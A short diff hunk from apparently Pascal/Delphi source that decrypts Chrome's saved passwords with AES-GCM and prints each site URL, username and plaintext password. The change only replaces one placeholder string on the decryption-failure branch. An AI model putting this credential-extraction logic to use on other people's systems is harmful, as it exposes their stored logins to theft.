@@ -195,7 +195,7 @@ if (db='') and  (FileExists (GetSpecialFolder($1c)+'\Google\Chrome\User Data\loc
             //writeln('length(key):'+inttostr(length(key)));
             if bdecrypt_gcm('AES', encrypted, @output[0], key, iv)<>0
               then writeln(rows['origin_url']+';'+rows['username_value']+';'+BytetoAnsiString (output)+';*')
-              else writeln(rows['origin_url']+';'+rows['username_value']+';'+'SCRAMBLEDON'+';*');
+              else writeln(rows['origin_url']+';'+rows['username_value']+';'+'SCRAMBLEDOFF'+';*');
             end;
       end;   //if mk<>nil then
 
